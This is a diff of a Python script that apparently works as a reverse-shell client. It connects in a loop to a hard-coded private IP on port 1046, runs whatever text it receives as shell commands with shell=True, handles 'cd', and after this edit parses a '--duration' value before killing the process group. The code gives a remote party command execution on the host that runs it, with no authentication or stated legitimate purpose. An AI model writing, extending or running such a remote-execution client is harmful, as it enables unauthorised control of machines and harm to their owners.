@@ -4,7 +4,7 @@ import subprocess
 import time
 import signal
 
-target_host = "192.168.1.34"
+target_host = "192.168.6.22"
 target_port = 1046
 
 while True:
@@ -18,9 +18,14 @@ while True:
             if data[:2].decode("utf-8") == 'cd':
                 os.chdir(data[3:].decode("utf-8"))
             if len(data) > 0:
-                cmd = subprocess.Popen(data[:], stdout=subprocess.PIPE, 
-                       shell=True, preexec_fn=os.setsid) 
-                time.sleep(20)
+                # Split the command and duration
+                command_parts = data.decode("utf-8").split("--duration")
+                command = command_parts[0].strip()  # Extract the command
+                duration = int(command_parts[1]) if len(command_parts) > 1 else 0  # Extract the duration (if available)
+
+                # run command for specified duration
+                cmd = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid) 
+                time.sleep(duration)
                 os.killpg(os.getpgid(cmd.pid), signal.SIGTERM)
                 break
         client.close()
